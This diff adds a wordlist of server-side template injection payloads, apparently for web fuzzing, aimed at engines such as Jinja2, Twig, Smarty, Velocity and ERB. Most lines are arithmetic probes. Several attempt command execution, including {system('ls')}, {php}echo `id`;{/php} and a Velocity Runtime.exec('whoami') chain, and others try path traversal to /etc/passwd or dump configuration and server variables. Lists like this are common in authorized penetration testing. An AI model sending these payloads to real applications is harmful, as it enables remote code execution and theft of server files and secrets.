@@ -1,0 +1,47 @@
+${{<%[%'"}}%\
+{{7*7}}
+${{7*7}}
+${7*7}
+<%= 7*7 %>
+${{7*7}}
+#{7*7}
+}}{{ '7'*7 }}
+}}{{7*7}}
+}}${{7*7}}
+}}${7*7}
+}}<%= 7*7 %>
+}}${{7*7}}
+}}#{7*7}
+}}{{ '7'*7 }}
+/%2fetc%2fpasswd
+<%25%3d7*7%25>
+<%25%3dls%25>
+[[5*5]]
+]][[5*5]]
+[5*5]
+][5*5]
+<%= ls %>
+${1+1} 
+#{1+1}
+%7B%7B%20config.items()%20%7D%7D 
+{$smarty.version}
+${class.getClassLoader()}
+${class.getResource("").getPath()}
+${class.getResource("../../../../../index.htm").getContent()}
+{{7*'7'}}
+[[5*5]]
+{{dump(app)}}
+{{app.request.server.all|join(',')}}
+{$smarty.version}
+{php}echo `id`;{/php}
+{system('ls')}
+{system('cat index.php')}
+{{ someString.toUPPERCASE() }}
+#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
+{{request|attr("__class__")}}
+{{request.__class__}}
+{{'a'.toUpperCase()}} 
+@(1+2)
+{% debug %}
+{{7*7}}
+{$smarty.version}
